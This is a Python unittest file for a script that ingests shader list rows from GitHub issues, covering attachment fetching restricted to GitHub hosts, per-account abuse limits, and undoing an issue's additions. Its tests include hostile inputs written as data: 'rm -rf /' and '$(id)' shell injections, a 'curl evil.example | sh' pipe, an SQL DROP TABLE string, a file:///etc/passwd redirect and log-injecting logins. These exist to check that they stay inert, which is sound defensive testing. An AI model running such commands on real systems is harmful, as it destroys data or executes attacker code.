"""Shared shader list submissions: reading rows out of an issue, the abuse limits, adding them and undoing an issue."""
import contextlib
import http.server
import io
import json
import sys
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]/'scripts'))
import process_shader_issue as psi
from process_shader_issue import apply, decide, extract_rows, undo
from shader_list import HEADER, ShaderList

DEPS = '{"attr":{},"fout":{},"img":{},"tex":{}}'
NOW = datetime(2026, 10, 24, 12, 0, tzinfo=timezone.utc)
OLD = NOW - timedelta(days=400)
ATTACHMENT = 'https://github.com/user-attachments/files/123456/shader-list-contribution.txt'


def key(i):
    return f'{i:064x}'


def row(i):
    return ('V', key(i), DEPS)


def line(i):
    return '\t'.join(row(i))


IDS = {'alice': 7, 'bob': 8}


def issue(number, login='alice', body='', uid=None):
    uid = uid if uid is not None else IDS.get(login, 99)
    return {'number': number, 'title': 'Shader list: 3 shaders', 'body': body, 'user': {'login': login, 'id': uid}}


def no_fetch(url):
    raise AssertionError(f'fetched {url}')


class Folder:
    """A temporary assets folder: the list, the log and the per-issue records."""
    def __init__(self, rows=()):
        self.tmp = tempfile.TemporaryDirectory()
        base = Path(self.tmp.name)
        self.list = base/'shader_list.tsv'
        self.log = base/'shader_list_log.tsv'
        self.records = base/psi.RECORDS
        lst = ShaderList()
        lst.add(rows)
        lst.save(self.list)
        self.log.write_text(psi.LOG_HEADER, encoding='utf-8')

    def shader_list(self):
        return ShaderList.load(self.list)

    def log_lines(self):
        return [l for l in self.log.read_text(encoding='utf-8').splitlines() if not l.startswith('#')]

    def close(self):
        self.tmp.cleanup()

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


class Extract(unittest.TestCase):
    def test_extract_from_paste_with_fences_crlf_bom(self):
        body = ('### Game version\r\n\r\n2.0.0\r\n\r\n### shader-list-contribution.txt\r\n\r\n```\r\n﻿'
                + line(1) + '\r\n' + line(2) + '\r\n' + line(1) + '\r\nnot a row\r\n```\r\n')
        self.assertEqual(extract_rows(body, fetch=no_fetch), [row(1), row(2)])

    def test_extract_only_shader_rows(self):
        body = line(1) + '\nR\tabcd\tm\n'
        self.assertEqual(extract_rows(body, fetch=no_fetch), [row(1)])

    def test_extract_reads_attachments(self):
        got = []

        def fetch(url):
            got.append(url)
            return ('﻿' + line(3) + '\r\n' + line(4) + '\n').encode()
        body = f'### shader-list-contribution.txt\n\n[shader-list-contribution.txt]({ATTACHMENT})\n'
        self.assertEqual(extract_rows(body, fetch=fetch), [row(3), row(4)])
        self.assertEqual(got, [ATTACHMENT])

    def test_extract_ignores_foreign_links(self):
        body = '\n'.join([
            'https://gist.githubusercontent.com/evil/0123abcd/raw/list.txt',
            'https://gist.github.com/evil/0123abcd',
            'https://example.com/user-attachments/files/1/list.txt',
            'https://github.com.evil.example/user-attachments/files/1/list.txt',
            'https://github.com/evil/user-attachments/files/1/list.txt',
            'https://github.com/evil/repo/files/1/list.txt',
            'http://github.com/user-attachments/files/1/list.txt',
            'https://user@github.com/user-attachments/files/1/list.txt',
            'https://github.com:8443/user-attachments/files/1/list.txt',
            'https://github.com/user-attachments/files/1/../../evil/list.txt',
            'https://github.com/user-attachments/assets/1234',
        ])
        self.assertEqual(extract_rows(body, fetch=no_fetch), [])

    def test_extract_attachment_size_cap(self):
        big = (line(5) + '\n').encode() * (psi.MAX_ATTACHMENT // 70 + 10)
        self.assertGreater(len(big), psi.MAX_ATTACHMENT)
        self.assertEqual(extract_rows(f'[a]({ATTACHMENT})', fetch=lambda url: big), [])
        self.assertEqual(psi.MAX_ATTACHMENT, 5 * 1024 * 1024)

    def test_extract_attachment_that_fails_is_skipped(self):
        def fetch(url):
            raise OSError('timed out')
        self.assertEqual(extract_rows(f'{line(1)}\n[a]({ATTACHMENT})', fetch=fetch), [row(1)])

    def test_fetch_follows_redirects_only_to_github(self):
        handler = psi._GitHubRedirects()
        req = urllib.request.Request(ATTACHMENT)
        for ok in ('https://objects.githubusercontent.com/github-production-repository-file/1?x=y', 'https://github.com/a'):
            self.assertIsInstance(handler.redirect_request(req, None, 302, 'Found', {}, ok), urllib.request.Request)
        for bad in ('https://evil.example/x', 'http://objects.githubusercontent.com/x', 'https://githubusercontent.com.evil/x',
                    'https://evilgithubusercontent.com/x', 'https://u@objects.githubusercontent.com/x',
                    'https://objects.githubusercontent.com:444/x', 'file:///etc/passwd'):
            with self.assertRaises(urllib.error.URLError, msg=bad):
                handler.redirect_request(req, None, 302, 'Found', {}, bad)

    def test_fetch_stops_at_a_redirect_to_another_host(self):
        seen = []

        class Redirect(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                seen.append(self.path)
                self.send_response(302)
                self.send_header('Location', f'http://127.0.0.1:{self.server.server_port}/elsewhere')
                self.end_headers()

            def log_message(self, *args):
                pass
        server = http.server.HTTPServer(('127.0.0.1', 0), Redirect)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            with self.assertRaises(urllib.error.URLError):
                psi._fetch(f'http://127.0.0.1:{server.server_port}/user-attachments/files/1/a.txt')
        finally:
            server.shutdown()
            server.server_close()
        self.assertEqual(seen, ['/user-attachments/files/1/a.txt'])

    def test_shell_metacharacters_in_body_are_inert(self):
        body = ('$(rm -rf /)\n`rm -rf /`\n; rm -rf / #\n| curl evil.example | sh\n${{ secrets.GITHUB_TOKEN }}\n'
                "'; DROP TABLE x; --\n\"$(id)\"\nV\t$(id)\t{}\n\x00\x1b[31m\n")
        self.assertEqual(extract_rows(body, fetch=no_fetch), [])
        with Folder() as f:
            d = decide(issue(9, body=body), OLD, NOW, f.log, f.shader_list())
            self.assertEqual((d.accept, d.reason), (False, 'no_rows'))


class Decide(unittest.TestCase):
    def setUp(self):
        self.f = Folder(rows=[row(1)])
        self.addCleanup(self.f.close)

    def decide(self, number, login='alice', body=None, created=OLD, uid=None, now=NOW):
        body = body if body is not None else f'{line(1)}\n{line(2)}\n{line(3)}\n'
        return decide(issue(number, login, body, uid), created, now, self.f.log, self.f.shader_list())

    def test_accepts_new_rows(self):
        d = self.decide(5)
        self.assertEqual((d.accept, d.reason, d.rows), (True, 'ok', [row(2), row(3)]))

    def test_new_account_rejected(self):
        d = self.decide(5, created=NOW - timedelta(days=6, hours=23))
        self.assertEqual((d.accept, d.reason), (False, 'new_account'))
        self.assertEqual(self.decide(5, created=NOW - timedelta(days=7)).reason, 'ok')

    def test_daily_limit_same_user_other_issue(self):
        apply(self.decide(3), issue(3), self.f.list, self.f.log, now=NOW - timedelta(hours=11))
        d = self.decide(5, body=line(4))
        self.assertEqual((d.accept, d.reason), (False, 'daily_limit'))
        self.assertEqual(self.decide(5, login='bob', body=line(4)).reason, 'ok')

    def test_daily_limit_follows_the_account_id_not_the_login(self):
        apply(self.decide(3), issue(3), self.f.list, self.f.log, now=NOW - timedelta(hours=1))
        self.assertEqual(self.f.log_lines(), ['3\t7:alice\t2026-10-24T11:00:00Z\t2'])
        self.assertEqual(self.decide(5, login='alice-renamed', uid=7, body=line(4)).reason, 'daily_limit')
        self.assertEqual(self.decide(5, login='alice', uid=70, body=line(4)).reason, 'ok')   # same name, other account

    def test_old_issue_adds_nothing_on_a_later_day(self):
        apply(self.decide(3), issue(3), self.f.list, self.f.log, now=NOW - timedelta(days=1))
        before = self.f.list.read_bytes()
        d = self.decide(3, body=f'{line(2)}\n{line(4)}')
        self.assertEqual((d.accept, d.reason, d.rows), (False, 'old_issue', []))
        self.assertEqual(apply(d, issue(3), self.f.list, self.f.log, now=NOW), 0)
        self.assertEqual(self.f.list.read_bytes(), before)
        self.assertEqual(psi.comment('old_issue', 0, '2026-10-23'),
                         'Thanks! This issue was already added on 2026-10-23. To share more shaders, please open a new issue.')

    def test_daily_limit_resets_the_next_utc_day(self):
        apply(self.decide(3), issue(3), self.f.list, self.f.log, now=NOW - timedelta(hours=13))   # 23:00 yesterday
        self.assertEqual(self.decide(5, body=line(4)).reason, 'ok')

    def test_daily_limit_not_charged_for_same_issue_edit(self):
        apply(self.decide(3), issue(3), self.f.list, self.f.log, now=NOW)
        d = self.decide(3, body=f'{line(2)}\n{line(4)}')
        self.assertEqual((d.accept, d.reason, d.rows), (True, 'ok', [row(4)]))

    def test_too_many_rows(self):
        body = '\n'.join(line(i) for i in range(10, 10 + psi.MAX_NEW_ROWS + 1))
        d = self.decide(5, body=body)
        self.assertEqual((d.accept, d.reason), (False, 'too_many'))
        body = '\n'.join(line(i) for i in range(10, 10 + psi.MAX_NEW_ROWS))
        self.assertEqual(self.decide(5, body=body).reason, 'ok')
        self.assertEqual(psi.MAX_NEW_ROWS, 2000)

    def test_too_many_counts_what_the_issue_already_added(self):
        first = '\n'.join(line(i) for i in range(10, 1510))
        apply(self.decide(5, body=first), issue(5), self.f.list, self.f.log, now=NOW)
        more = '\n'.join(line(i) for i in range(1510, 2111))   # 1,500 + 601 > 2,000 for one issue
        self.assertEqual(self.decide(5, body=more).reason, 'too_many')

    def test_same_day_edits_keep_the_cap_and_the_daily_limit(self):
        # issue 5 accepted, then edited the same day: the 2,000 rows are counted across every edit
        apply(self.decide(5, body='\n'.join(line(i) for i in range(10, 1010))), issue(5), self.f.list, self.f.log, now=NOW)
        edit = self.decide(5, body='\n'.join(line(i) for i in range(10, 2010)))   # 1,000 more: 2,000 in all
        self.assertEqual((edit.reason, len(edit.rows)), ('ok', 1000))
        apply(edit, issue(5), self.f.list, self.f.log, now=NOW)
        self.assertEqual(len(ShaderList.load(self.f.records/'5.tsv').rows()), 2000)
        self.assertEqual(self.decide(5, body=line(2010)).reason, 'too_many')   # one more, after two accepted edits
        self.assertEqual(self.f.log_lines(), ['5\t7:alice\t2026-10-24T12:00:00Z\t1000'])   # one log line
        # editing issue 5 does not open a second issue's day: another issue of the account is still refused today
        self.assertEqual(self.decide(6, body=line(3000)).reason, 'daily_limit')
        self.assertEqual(self.decide(6, body=line(3000), now=NOW + timedelta(days=1)).reason, 'ok')

    def test_nothing_new(self):
        d = self.decide(5, body=line(1))
        self.assertEqual((d.accept, d.reason, d.rows), (False, 'nothing_new', []))

    def test_no_rows(self):
        self.assertEqual(self.decide(5, body='I played for 2 hours').reason, 'no_rows')

    def test_every_reason_has_a_comment(self):
        for reason in ('no_account', 'new_account', 'daily_limit', 'too_many', 'nothing_new', 'no_rows', 'ok', 'old_issue'):
            self.assertTrue(psi.comment(reason, 3))
        self.assertIn('tomorrow', psi.comment('daily_limit', 0))
        self.assertEqual(psi.comment('too_many', 0), 'Thanks! This is more than 2,000 new shaders in one go. '
                                                     'Please split it into smaller parts over several days.')


class ApplyAndUndo(unittest.TestCase):
    def setUp(self):
        self.f = Folder(rows=[row(1)])
        self.addCleanup(self.f.close)

    def submit(self, number, rows, login='alice'):
        body = '\n'.join(line(i) for i in rows)
        d = decide(issue(number, login, body), OLD, NOW, self.f.log, self.f.shader_list())
        return apply(d, issue(number, login, body), self.f.list, self.f.log, now=NOW)

    def test_apply_idempotent_on_edit(self):
        self.assertEqual(self.submit(5, [1, 2, 3]), 2)
        self.assertEqual(self.submit(5, [1, 2, 3]), 0)   # the same issue run again (edited, reopened)
        self.assertEqual(self.f.log_lines(), ['5\t7:alice\t2026-10-24T12:00:00Z\t2'])
        self.assertEqual(self.submit(5, [1, 2, 3, 4]), 1)   # edited to add a row
        self.assertEqual(self.f.log_lines(), ['5\t7:alice\t2026-10-24T12:00:00Z\t2'])
        self.assertEqual(self.f.shader_list().rows(), [row(1), row(2), row(3), row(4)])
        self.assertEqual(ShaderList.load(self.f.records/'5.tsv').rows(), [row(2), row(3), row(4)])
        self.assertTrue(self.f.list.read_text(encoding='utf-8').startswith(HEADER))

    def test_apply_rejected_changes_nothing(self):
        before = self.f.list.read_bytes()
        d = psi.Decision(False, [row(9)], 'daily_limit')
        self.assertEqual(apply(d, issue(5), self.f.list, self.f.log, now=NOW), 0)
        self.assertEqual(self.f.list.read_bytes(), before)
        self.assertEqual(self.f.log_lines(), [])
        self.assertFalse((self.f.records/'5.tsv').exists())

    def test_hostile_login_is_not_written_as_is(self):
        self.submit(5, [2], login='a\tb\n6\tmallory')
        self.assertEqual(self.f.log_lines(), ['5\t99:-\t2026-10-24T12:00:00Z\t1'])

    def test_event_without_an_account_id_is_rejected(self):
        body = line(2)
        self.assertEqual(self.submit(3, [3]), 1)   # a log line of today whose user column is '-' must not matter either
        for uid in ('7', 0, -1, 7.0, True, None):
            bad = issue(5, body=body)
            bad['user']['id'] = uid
            d = decide(bad, OLD, NOW, self.f.log, self.f.shader_list(), fetch=no_fetch)
            self.assertEqual((d.accept, d.reason, d.rows), (False, 'no_account', []), uid)
            self.assertEqual(apply(d, bad, self.f.list, self.f.log, now=NOW), 0)
        nouser = {'number': 6, 'title': 'Shader list: 1 shaders', 'body': body}
        self.assertEqual(decide(nouser, OLD, NOW, self.f.log, self.f.shader_list()).reason, 'no_account')
        self.assertEqual(self.f.log_lines(), ['3\t7:alice\t2026-10-24T12:00:00Z\t1'])
        self.assertIn('signed in', psi.comment('no_account', 0))

    def test_undo_removes_only_that_issues_rows(self):
        self.assertEqual(self.submit(5, [2, 3]), 2)
        lst = self.f.shader_list()   # the owner takes row 3 out by hand; a later issue adds it again
        lst.remove([row(3)])
        lst.save(self.f.list)
        self.assertEqual(self.submit(7, [3, 4], login='bob'), 2)
        self.assertEqual(undo(5, self.f.list, self.f.log, self.f.records), 1)
        self.assertEqual(self.f.shader_list().rows(), [row(1), row(3), row(4)])
        self.assertFalse((self.f.records/'5.tsv').exists())
        self.assertEqual(len(self.f.log_lines()), 2)   # the log keeps the line: that day stays used
        self.assertEqual(undo(5, self.f.list, self.f.log, self.f.records), 0)   # again: nothing to do

    def test_undo_unknown_issue(self):
        self.assertEqual(undo(42, self.f.list, self.f.log, self.f.records), 0)
        self.assertEqual(self.f.shader_list().rows(), [row(1)])


class Cli(unittest.TestCase):
    def test_event_run_writes_comment_and_outputs(self):
        with Folder() as f:
            tmp = Path(f.tmp.name)
            event = tmp/'event.json'
            event.write_text(json.dumps({'action': 'opened', 'issue': issue(5, body=line(2))}), encoding='utf-8')
            out, comment = tmp/'out.txt', tmp/'comment.md'
            said = io.StringIO()
            with contextlib.redirect_stdout(said):
                code = psi.main(['--event', str(event), '--author-created', '2020-01-01T00:00:00Z', '--out-comment',
                                 str(comment), '--list', str(f.list), '--log', str(f.log), '--github-output', str(out)], now=NOW)
            self.assertEqual(said.getvalue(), 'issue #5: ok, 1 rows added\n')
            self.assertEqual(code, 0)
            self.assertIn('1 new', comment.read_text(encoding='utf-8'))
            self.assertEqual(out.read_text(encoding='utf-8').splitlines(),
                             ['reason=ok', 'added=1', 'close=completed', 'issue=5', 'login=alice'])
            self.assertEqual(f.shader_list().rows(), [row(2)])

    def test_bad_author_date_fails(self):
        with Folder() as f:
            tmp = Path(f.tmp.name)
            event = tmp/'event.json'
            event.write_text(json.dumps({'issue': issue(5, body=line(2))}), encoding='utf-8')
            with self.assertRaises(SystemExit):
                psi.main(['--event', str(event), '--author-created', '$(id)', '--out-comment', str(tmp/'c'),
                          '--list', str(f.list), '--log', str(f.log)], now=NOW)


if __name__ == '__main__':
    unittest.main()
